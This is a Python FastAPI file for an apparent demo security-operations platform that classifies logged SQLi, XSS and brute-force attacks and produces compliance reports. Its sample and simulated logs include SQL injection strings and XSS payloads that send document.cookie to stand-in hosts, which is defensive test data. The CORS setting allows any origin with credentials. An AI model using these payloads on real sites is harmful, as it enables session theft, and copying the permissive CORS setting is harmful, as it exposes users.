import random
from datetime import datetime, timezone
from typing import List, Optional
from fastapi import FastAPI, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from sqlalchemy.orm import Session

from models import Base, engine, SessionLocal, SecurityLog, SecurityControl, AuditEvidence, ComplianceReport
from engine import (
    classify_and_score_log,
    build_evidence_hash,
    generate_compliance_report_markdown,
    CONTROL_MAPPING,
)

Base.metadata.create_all(bind=engine)

app = FastAPI(
    title="Autonomous Security Operations Platform (ASOP)",
    description="AI-enabled security assurance platform for log ingestion, threat anomaly classification (SQLi, XSS, Brute Force), automated risk scoring, real-time control validation, and Gemini LLM compliance reporting.",
    version="1.0.0",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


class LogIngestRequest(BaseModel):
    source_ip: str
    service: str = "api-gateway"
    endpoint: str
    method: str = "POST"
    payload: str


INITIAL_CONTROLS = [
    {
        "control_id": "ISO-A.8.26",
        "framework": "ISO/IEC 27001:2022",
        "name": "Application Security & SQL Injection Prevention",
        "description": "Validates input sanitization and parameterized query enforcement against SQLi payloads.",
    },
    {
        "control_id": "OWASP-V5.3",
        "framework": "OWASP ASVS 4.0",
        "name": "Output Encoding & XSS Defense",
        "description": "Validates DOM sanitization and Content-Security-Policy enforcement against script injection.",
    },
    {
        "control_id": "NIST-AC-7",
        "framework": "NIST SP 800-53 Rev. 5",
        "name": "Unsuccessful Logon Attempts & Brute Force Lockout",
        "description": "Enforces automated rate limiting and account lockout upon anomalous authentication bursts.",
    },
    {
        "control_id": "ISO-A.8.15",
        "framework": "ISO/IEC 27001:2022",
        "name": "Immutable Audit Logging & Evidence Collection",
        "description": "Ensures every security anomaly is recorded with a cryptographic SHA-256 chain-of-custody hash.",
    },
]

SAMPLE_SIMULATION_LOGS = [
    {
        "source_ip": "185.220.101.44",
        "service": "auth-service",
        "endpoint": "/api/v1/auth/login",
        "method": "POST",
        "payload": "username=admin'--&password=1' OR '1'='1",
    },
    {
        "source_ip": "45.155.205.109",
        "service": "customer-portal",
        "endpoint": "/api/v1/profile/bio",
        "method": "PUT",
        "payload": "<script>fetch('https://evil.tld/steal?c='+document.cookie)</script>",
    },
    {
        "source_ip": "103.145.13.88",
        "service": "auth-service",
        "endpoint": "/api/v1/admin/token",
        "method": "POST",
        "payload": "401 Unauthorized - consecutive_failures=18 user=root wordlist=rockyou (hydra brute force)",
    },
    {
        "source_ip": "198.51.100.23",
        "service": "billing-api",
        "endpoint": "/api/v1/invoices/search?q=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--",
        "method": "GET",
        "payload": "q=1 UNION SELECT username,password_hash FROM users--",
    },
    {
        "source_ip": "10.0.14.21",
        "service": "payment-gateway",
        "endpoint": "/api/v1/transactions/summary",
        "method": "GET",
        "payload": "account_id=acct_90210&period=2026-Q1",
    },
    {
        "source_ip": "91.240.118.172",
        "service": "feedback-widget",
        "endpoint": "/api/v1/comments",
        "method": "POST",
        "payload": "<img src=x onerror=\"javascript:alert(document.domain)\">",
    },
]


def _ingest_single_log(db: Session, item: LogIngestRequest) -> SecurityLog:
    analysis = classify_and_score_log(
        source_ip=item.source_ip,
        service=item.service,
        endpoint=item.endpoint,
        method=item.method,
        payload=item.payload,
    )
    now = datetime.now(timezone.utc)
    log_row = SecurityLog(
        timestamp=now,
        source_ip=item.source_ip,
        service=item.service,
        endpoint=item.endpoint,
        method=item.method,
        payload=item.payload,
        threat_type=analysis["threat_type"],
        severity=analysis["severity"],
        risk_score=analysis["risk_score"],
        mitre_tactic=analysis["mitre_tactic"],
        ai_reasoning=analysis["ai_reasoning"],
        automated_action=analysis["automated_action"],
    )
    db.add(log_row)
    db.flush()

    # Automated Audit Evidence Collection for all non-normal threats
    if analysis["threat_type"] != "Normal":
        ctrl_id = CONTROL_MAPPING.get(analysis["threat_type"], "ISO-A.8.15")
        ev_hash = build_evidence_hash(
            source_ip=item.source_ip,
            endpoint=item.endpoint,
            payload=item.payload,
            threat_type=analysis["threat_type"],
            timestamp_iso=f"{now.isoformat()}-{log_row.id}-{random.randint(1000,9999)}",
        )
        evidence = AuditEvidence(
            log_id=log_row.id,
            control_id=ctrl_id,
            evidence_hash=ev_hash,
            threat_type=analysis["threat_type"],
            source_ip=item.source_ip,
            captured_payload=item.payload[:300],
            response_taken=analysis["automated_action"],
            created_at=now,
        )
        db.add(evidence)

    db.commit()
    db.refresh(log_row)
    _recompute_controls(db)
    return log_row


def _recompute_controls(db: Session):
    logs = db.query(SecurityLog).all()
    total = max(1, len(logs))
    counts = {"SQLi": 0, "XSS": 0, "Brute Force": 0}
    for l in logs:
        if l.threat_type in counts:
            counts[l.threat_type] += 1

    mapping_threat = {
        "ISO-A.8.26": counts["SQLi"],
        "OWASP-V5.3": counts["XSS"],
        "NIST-AC-7": counts["Brute Force"],
        "ISO-A.8.15": 0,  # Audit logging always active
    }

    for ctrl in db.query(SecurityControl).all():
        hits = mapping_threat.get(ctrl.control_id, 0)
        if ctrl.control_id == "ISO-A.8.15":
            ctrl.status = "PASS"
            ctrl.pass_rate = 100.0
            ctrl.evidence_count = db.query(AuditEvidence).count()
        else:
            ratio = max(0.0, 100.0 - (hits / total) * 115.0)
            ctrl.pass_rate = round(ratio, 1)
            ctrl.evidence_count = hits
            if hits >= 4:
                ctrl.status = "WARNING" if ratio >= 65 else "FAIL"
            elif hits >= 1:
                ctrl.status = "PASS" if ratio >= 80 else "WARNING"
            else:
                ctrl.status = "PASS"
        ctrl.last_validated = datetime.now(timezone.utc)
    db.commit()


@app.on_event("startup")
def seed_initial_data():
    db = SessionLocal()
    try:
        if db.query(SecurityControl).count() == 0:
            for c in INITIAL_CONTROLS:
                db.add(
                    SecurityControl(
                        control_id=c["control_id"],
                        framework=c["framework"],
                        name=c["name"],
                        description=c["description"],
                        status="PASS",
                        pass_rate=100.0,
                        evidence_count=0,
                    )
                )
            db.commit()

        if db.query(SecurityLog).count() == 0:
            for sample in SAMPLE_SIMULATION_LOGS:
                _ingest_single_log(db, LogIngestRequest(**sample))

            # Generate an initial baseline compliance report so the UI is immediately rich
            _create_report(db)
    finally:
        db.close()


def _create_report(db: Session) -> ComplianceReport:
    logs = db.query(SecurityLog).order_by(SecurityLog.id.desc()).all()
    controls = db.query(SecurityControl).all()
    evidence = db.query(AuditEvidence).order_by(AuditEvidence.id.desc()).limit(10).all()

    threat_counts = {"SQLi": 0, "XSS": 0, "Brute Force": 0, "Normal": 0}
    for l in logs:
        threat_counts[l.threat_type] = threat_counts.get(l.threat_type, 0) + 1

    anomalous_scores = [l.risk_score for l in logs if l.threat_type != "Normal"]
    overall_risk = round(sum(anomalous_scores) / len(anomalous_scores), 1) if anomalous_scores else 12.0
    compliance_score = round(sum(c.pass_rate for c in controls) / max(1, len(controls)), 1)
    critical_cnt = sum(1 for l in logs if l.severity in ("CRITICAL", "HIGH"))

    ctrl_dicts = [
        {
            "control_id": c.control_id,
            "framework": c.framework,
            "name": c.name,
            "status": c.status,
            "pass_rate": c.pass_rate,
            "evidence_count": c.evidence_count,
        }
        for c in controls
    ]
    ev_dicts = [
        {
            "control_id": e.control_id,
            "threat_type": e.threat_type,
            "source_ip": e.source_ip,
            "response_taken": e.response_taken,
            "evidence_hash": e.evidence_hash,
        }
        for e in evidence
    ]

    generated_by, md = generate_compliance_report_markdown(
        overall_risk=overall_risk,
        compliance_score=compliance_score,
        total_logs=len(logs),
        threat_counts=threat_counts,
        controls=ctrl_dicts,
        recent_evidence=ev_dicts,
    )

    rep = ComplianceReport(
        title=f"ISO 27001 / NIST Security Assurance & Incident Summary ({datetime.now(timezone.utc).strftime('%H:%M:%S UTC')})",
        overall_risk_score=overall_risk,
        compliance_score=compliance_score,
        total_logs_analyzed=len(logs),
        critical_incidents=critical_cnt,
        generated_by=generated_by,
        markdown_content=md,
    )
    db.add(rep)
    db.commit()
    db.refresh(rep)
    return rep


@app.get("/", response_class=HTMLResponse)
def instant_soc_dashboard():
    from pathlib import Path
    html_file = Path(__file__).parent / "instant_ui.html"
    return HTMLResponse(content=html_file.read_text(encoding="utf-8"))


@app.get("/api/dashboard")
def get_dashboard_overview(db: Session = Depends(get_db)):
    logs = db.query(SecurityLog).order_by(SecurityLog.id.desc()).limit(50).all()
    controls = db.query(SecurityControl).order_by(SecurityControl.id.asc()).all()
    evidence = db.query(AuditEvidence).order_by(AuditEvidence.id.desc()).limit(25).all()
    reports = db.query(ComplianceReport).order_by(ComplianceReport.id.desc()).limit(5).all()

    threat_counts = {"SQLi": 0, "XSS": 0, "Brute Force": 0, "Normal": 0}
    for l in logs:
        threat_counts[l.threat_type] = threat_counts.get(l.threat_type, 0) + 1

    anomalous = [l.risk_score for l in logs if l.threat_type != "Normal"]
    overall_risk = round(sum(anomalous) / len(anomalous), 1) if anomalous else 10.0
    compliance_score = round(sum(c.pass_rate for c in controls) / max(1, len(controls)), 1)

    return {
        "metrics": {
            "total_logs": len(logs),
            "overall_risk_score": overall_risk,
            "compliance_score": compliance_score,
            "active_incidents": len(anomalous),
            "evidence_collected": len(evidence),
            "threat_counts": threat_counts,
        },
        "logs": [
            {
                "id": l.id,
                "timestamp": l.timestamp.isoformat(),
                "source_ip": l.source_ip,
                "service": l.service,
                "endpoint": l.endpoint,
                "method": l.method,
                "payload": l.payload,
                "threat_type": l.threat_type,
                "severity": l.severity,
                "risk_score": l.risk_score,
                "mitre_tactic": l.mitre_tactic,
                "ai_reasoning": l.ai_reasoning,
                "automated_action": l.automated_action,
            }
            for l in logs
        ],
        "controls": [
            {
                "control_id": c.control_id,
                "framework": c.framework,
                "name": c.name,
                "description": c.description,
                "status": c.status,
                "pass_rate": c.pass_rate,
                "evidence_count": c.evidence_count,
                "last_validated": c.last_validated.isoformat(),
            }
            for c in controls
        ],
        "evidence": [
            {
                "id": e.id,
                "log_id": e.log_id,
                "control_id": e.control_id,
                "evidence_hash": e.evidence_hash,
                "threat_type": e.threat_type,
                "source_ip": e.source_ip,
                "captured_payload": e.captured_payload,
                "response_taken": e.response_taken,
                "created_at": e.created_at.isoformat(),
            }
            for e in evidence
        ],
        "reports": [
            {
                "id": r.id,
                "title": r.title,
                "overall_risk_score": r.overall_risk_score,
                "compliance_score": r.compliance_score,
                "total_logs_analyzed": r.total_logs_analyzed,
                "critical_incidents": r.critical_incidents,
                "generated_by": r.generated_by,
                "markdown_content": r.markdown_content,
                "created_at": r.created_at.isoformat(),
            }
            for r in reports
        ],
    }


@app.post("/api/logs/ingest")
def ingest_log(req: LogIngestRequest, db: Session = Depends(get_db)):
    row = _ingest_single_log(db, req)
    return {"status": "ingested", "log_id": row.id, "threat_type": row.threat_type, "risk_score": row.risk_score}


@app.post("/api/logs/simulate")
def simulate_attack_wave(db: Session = Depends(get_db)):
    """Fires a realistic wave of 4 live security logs (SQLi, XSS, Brute Force, Normal) for instant demo."""
    wave = [
        LogIngestRequest(
            source_ip=f"185.220.101.{random.randint(10, 250)}",
            service="auth-service",
            endpoint="/api/v1/auth/login",
            method="POST",
            payload="user=admin' UNION SELECT 1,password FROM users--",
        ),
        LogIngestRequest(
            source_ip=f"45.155.205.{random.randint(10, 250)}",
            service="web-portal",
            endpoint="/api/v1/search",
            method="GET",
            payload="<svg onload=\"fetch('https://attacker.tld/c='+document.cookie)\">",
        ),
        LogIngestRequest(
            source_ip=f"103.145.13.{random.randint(10, 250)}",
            service="ssh-Bastion",
            endpoint="/api/v1/admin/login",
            method="POST",
            payload=f"401 Unauthorized - consecutive_failures={random.randint(12, 45)} credential stuffing burst",
        ),
        LogIngestRequest(
            source_ip=f"10.0.12.{random.randint(2, 99)}",
            service="core-ledger",
            endpoint="/api/v1/health/check",
            method="GET",
            payload="status=ok&latency_ms=14",
        ),
    ]
    created = [_ingest_single_log(db, item) for item in wave]
    return {"status": "simulated", "count": len(created)}


@app.post("/api/reports/generate")
def generate_report_endpoint(db: Session = Depends(get_db)):
    rep = _create_report(db)
    return {
        "id": rep.id,
        "title": rep.title,
        "generated_by": rep.generated_by,
        "markdown_content": rep.markdown_content,
    }
